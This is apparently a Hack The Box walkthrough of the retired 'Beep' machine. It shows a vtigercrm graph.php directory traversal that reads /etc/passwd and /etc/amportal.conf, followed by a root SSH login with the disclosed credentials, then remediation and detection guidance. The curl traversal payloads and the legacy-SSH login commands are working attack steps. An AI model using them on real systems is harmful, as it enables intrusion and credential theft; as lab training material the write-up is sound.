Hack The Box / Easy / Linux

Beep

An obsolete Elastix/FreePBX telephony stack exposes a very wide legacy footprint: Apache 2.2.3, Webmin 1.570, an Asterisk Manager interface, and several cleartext mail ports. The vtigercrm component ships graph.php with a current_language parameter vulnerable to directory traversal, allowing arbitrary file reads. Reading /etc/amportal.conf discloses reusable PBX credentials, which authenticate SSH as root over legacy key-exchange algorithms.

Retired machine · validated walkthrough · Authorized laboratory assessment · Reviewed: 2026-10-03

Dylan Senez / D4RKGUNN3R

Elastix, FreePBX, LFI, telephony, legacy stack

Case overview

Outcome

A local file inclusion in the vtigercrm graph.php endpoint disclosed /etc/passwd and then /etc/amportal.conf, yielding the Elastix/Asterisk credentials; those credentials gave an SSH session as root, and root.txt was read to complete the compromise.

Key takeaway

Bundled legacy web applications inside a management stack are as dangerous as the main service - a single outdated PHP component disclosed the credentials that unlocked the host.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • Full TCP sweep reveals a legacy telephony stack (Elastix, Apache 2.2.3, Webmin 1.570, AMI 5038)
  • HTTPS presents the Elastix login with an expired self-signed certificate
  • vtigercrm graph.php current_language traversal reads /etc/passwd
  • LFI reads /etc/amportal.conf and discloses PBX and manager credentials
  • SSH as root using legacy key-exchange algorithms
  • root.txt captured

1. Reconnaissance — Full TCP scan and service fingerprinting

Validated · Kali / attacker · EVD-001

Command / request

nmap -sV -sC -p- 192.0.2.10 -T4 --min-rate 5000

Observed result

Open ports observed: 22, 25, 80, 110, 111, 143, 443, 856, 993, 995, 3306, 4190, 4445, 4559, 5038, 10000
80/tcp    open  http      Apache httpd 2.2.3 ((CentOS))
443/tcp   open  ssl/http  Apache httpd 2.2.3 ((CentOS)); http-title: Elastix - Login page
10000/tcp open  http      MiniServ 1.570 (Webmin httpd)
5038/tcp  open  asterisk  Asterisk Call Manager 1.1
Service Info: OS: Linux; ssl-cert: CN=localhost.localdomain, not valid after 2018-04-07

Analysis

The target exposes a large, dated telephony footprint. Apache 2.2.3 on CentOS, Webmin MiniServ 1.570, an Asterisk Manager interface, and several cleartext mail ports all point to a stack that has not been maintained for years.

Why this mattered

Maps the unusually wide attack surface and flags immediately which components are end-of-life.

2. Reconnaissance — Fingerprint the Elastix web interface

Documented · Kali / attacker · EVD-002

Command / request

curl -k -I https://192.0.2.10/

Observed result

TLSv1.0 negotiated, DH 1024-bit, SHA1-signed; self-signed certificate (CN=localhost.localdomain) expired 2018-04-07
Server: Apache/2.2.3 (CentOS), PHP/5.1.6
http-title: Elastix - Login page
Set-Cookie: elastixSession=...

Analysis

The HTTPS virtual host is an Elastix login running an ancient Apache/PHP combination over TLS 1.0 with an expired certificate. Elastix bundles Asterisk and FreePBX components, so related web applications should be enumerated as well.

Why this mattered

Identifies the application stack whose bundled components hold the exploitable endpoint.

3. Exploitation — Confirm arbitrary file read via vtigercrm graph.php

Validated · Kali / attacker · EVD-003

Command / request

curl -k "https://192.0.2.10/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd&module=Accounts&action" | sed -n '1,200p'

Observed result

root:x:0:0:root:/root:/bin/bash
...
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.

Analysis

The current_language parameter is concatenated into a file path without sanitisation, so a traversal sequence reads arbitrary files. The partial /etc/passwd disclosure confirms the LFI and reveals the asterisk and fanis accounts; the trailing restriction message indicates an application filter that does not prevent the traversal itself.

Why this mattered

Establishes the file-disclosure primitive from which credentials are harvested.

4. Exploitation — Read configuration files and recover credentials

Validated · Kali / attacker · EVD-004

Command / request

curl -k "https://192.0.2.10/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&module=Accounts&action"

Observed result

AMPDBUSER: asteriskuser
AMPDBPASS: [REDACTED]
AMPMGRUSER (Asterisk AMI): admin
AMPMGRPASS (Asterisk AMI): [REDACTED]
FOPPASSWORD: [REDACTED]
ARI_ADMIN_USERNAME: admin
ARI_ADMIN_PASSWORD: [REDACTED]
AUTHTYPE: database

Analysis

amportal.conf holds the FreePBX/Elastix database and manager credentials in plaintext. Because these are reused across the web admin, the Asterisk Manager interface, and local accounts, the LFI now translates directly into authenticated access.

Why this mattered

Converts a file-disclosure bug into reusable credentials, including the system root password.

5. Privilege Escalation — Authenticate as root over legacy SSH and capture the root proof

Validated · Kali / attacker · EVD-005

Command / request

ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@192.0.2.10
whoami
cat /root/root.txt

Observed result

root
[REDACTED]

Analysis

The credentials recovered from amportal.conf authenticate a direct SSH login as root once the client is forced to offer the target's legacy key-exchange and host-key algorithms. Reading /root/root.txt confirms full host compromise.

Why this mattered

Completes the chain from an unauthenticated file read to root, requiring only the older SSH algorithms the server still supports.

Findings & remediation

F-1 — Local file inclusion in vtigercrm graph.php

High · Validated · https://192.0.2.10/vtigercrm/graph.php

Description

The graph.php endpoint uses the current_language parameter in a file path without validation, allowing directory traversal (and historical null-byte injection) to read arbitrary files on the server.

Impact

Disclosure of sensitive files including /etc/passwd and /etc/amportal.conf, exposing reusable PBX, manager and system credentials that led to full root compromise.

Root cause

Unsanitised, caller-controlled input is used to build a filesystem path in a bundled third-party web application that is no longer maintained.

Remediation

  • Patch or remove the vulnerable vtigercrm component
  • Validate and whitelist parameters used in file paths and disable dangerous wrappers
  • Restrict the web server's filesystem read permissions and prevent null-byte termination
  • Rotate any credentials disclosed through the disclosure

Validation

  • Traversal via current_language returned a partial /etc/passwd listing (asterisk, fanis) and then the contents of /etc/amportal.conf including plaintext credentials.

F-2 — End-of-life telephony stack exposed externally

High · Documented · 192.0.2.10:80, 443, 10000

Description

The host runs Apache 2.2.3 (CentOS), PHP 5.1.6 and an Elastix login over TLS 1.0 with an expired self-signed certificate, alongside Webmin MiniServ 1.570 on port 10000. All of these components are unsupported and have well-known historical vulnerabilities and weak defaults.

Impact

A broad, unmaintained administrative surface that is exploitable through multiple vectors, including the bundled vtigercrm application and legacy Webmin.

Root cause

A legacy Elastix 2.x distribution that was never upgraded or decommissioned, leaving numerous end-of-life components internet-facing.

Remediation

  • Decommission or replace the Elastix 2.x stack with a maintained distribution
  • Replace the expired certificate and disable TLS 1.0/legacy ciphers
  • Restrict Webmin and other management consoles to a trusted management network

Validation

  • Service detection and header review identified Apache 2.2.3/CentOS, PHP 5.1.6, TLS 1.0, and Webmin MiniServ 1.570 on the exposed ports.

F-3 — Asterisk Manager interface exposed on TCP/5038

Medium · Documented · 192.0.2.10:5038

Description

The Asterisk Call Manager 1.1 interface is reachable from the external network. AMI allows programmatic control of the PBX, and its credentials were recoverable from the plaintext amportal.conf file.

Impact

Unauthenticated reachability plus disclosed credentials enable call control, data leakage, and, in misconfigured setups, command execution via AMI actions.

Root cause

The AMI service is bound to an externally reachable interface and relies on credentials stored in plaintext configuration.

Remediation

  • Bind AMI to localhost or a management VLAN
  • Enforce strong, unique credentials and rate limiting and restrict AMI by firewall

Validation

  • Nmap identified Asterisk Call Manager 1.1 on 5038, and amportal.conf disclosed the manager username and secret.

F-4 — Legacy mail services exposed

Medium · Documented · 192.0.2.10:25, 110, 143, 993, 995, 4190

Description

Multiple mail protocols (SMTP, POP3, IMAP and their secure variants, plus Sieve) are open. Cleartext POP3 and IMAP ports present downgrade and interception risk if the environment is misconfigured.

Impact

Potential credential exposure, mailbox access, or relay abuse depending on configuration.

Root cause

A default telephony/mail bundle with legacy cleartext services left enabled.

Remediation

  • Require STARTTLS/TLS and disable cleartext POP3/IMAP where possible
  • Validate authentication policy and rate limiting on mail services

Validation

  • Service detection reported these ports open; versions were not confirmed, so impact remains a documented observation.

Analysis

Beep is dominated by breadth rather than depth: nearly every exposed service is end-of-life. The decisive weakness is not in Apache or Asterisk directly but in the bundled vtigercrm application, whose graph.php endpoint trusts a traversal path in the current_language parameter. That single file read cascades into credential disclosure, because Elastix stores the PBX database and manager passwords in a plaintext configuration file that also happens to be the SSH root credential.

Remediation

  • Decommission or upgrade the Elastix 2.x / FreePBX and vtigercrm stack; it is unsupported and no longer patched
  • Sanitise and whitelist file-path parameters; disable null-byte handling and dangerous wrappers
  • Rotate every credential stored in /etc/amportal.conf and move secrets out of plaintext configs
  • Restrict management interfaces (Webmin, AMI, WebDeploy-style consoles) to trusted networks and enforce HTTPS
  • Disable legacy SSH KEX/host-key algorithms and enforce modern cryptography

Defender perspective

The attack is almost entirely visible in web logs: directory-traversal sequences (../../) against a PHP endpoint, followed by reads of configuration files that should never be web-reachable. Combined with alerts on legacy SSH negotiation and on SSH logins as root from the internet, the whole chain is detectable without endpoint telemetry. The underlying issue is lifecycle management - these components should have been retired long before they were internet-facing.

Detection opportunities

  • Alert on traversal patterns (../ and encoded variants) and null bytes in web requests
  • Monitor for HTTP requests to sensitive files such as /etc/passwd and /etc/amportal.conf
  • Detect legacy SSH key-exchange or host-key algorithms in negotiation logs and direct-root SSH logins
  • Track management-console and AMI authentication attempts from external addresses

Lessons learned

  • An outdated application bundled with a platform is still part of the attack surface - inventory third-party components, not just the headline product
  • Configuration files that hold reusable credentials are high-value LFI targets
  • Password reuse across an application and the system root account turns a file read into full compromise
  • Legacy SSH algorithm support can be the difference between possessing credentials and being able to use them

Open questions

  • The export lists many open ports but did not confirm versions for the mail services (25, 110, 143, 993, 995, 4190), so their exposure is documented but not verified
  • The exact account mapping between /etc/amportal.conf credentials and the SSH root login is implied by the narrative rather than shown step by step
